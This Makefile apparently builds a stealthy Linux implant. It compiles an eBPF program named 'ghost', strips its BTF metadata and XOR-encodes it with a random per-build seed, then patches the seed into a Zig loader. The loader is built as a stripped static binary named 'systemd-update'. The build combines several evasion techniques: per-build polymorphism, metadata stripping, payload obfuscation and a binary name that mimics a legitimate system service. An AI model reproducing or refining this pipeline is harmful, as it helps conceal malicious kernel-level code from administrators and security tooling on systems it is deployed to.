CC = clang
ZIG = zig
SEED = $(shell head -c 4 /dev/urandom | xxd -p)

CFLAGS = -O3 -target bpf -DSEED=0x$(SEED) -g0 -fno-ident -I/usr/include/x86_64-linux-gnu

all: bpf build clean_obj

bpf:
	@mkdir -p target
	$(CC) $(CFLAGS) -c src/bpf/ghost.c -o target/ghost.o
	@llvm-strip --strip-unneeded -R .BTF -R .BTF.ext target/ghost.o
	@$(ZIG) run build/xor.zig -- target/ghost.o 0x$(SEED)

build:
	@sed -i 's/const SEED: u32 = .*;/const SEED: u32 = 0x$(SEED);/' src/main.zig
	$(ZIG) build-exe src/main.zig \
		-target x86_64-linux-musl \
		-O ReleaseSmall \
		-fstrip \
		-fsingle-threaded \
		--name systemd-update \
		--entry _start
	@mv systemd-update target/

clean_obj:
	@rm -f target/ghost.o
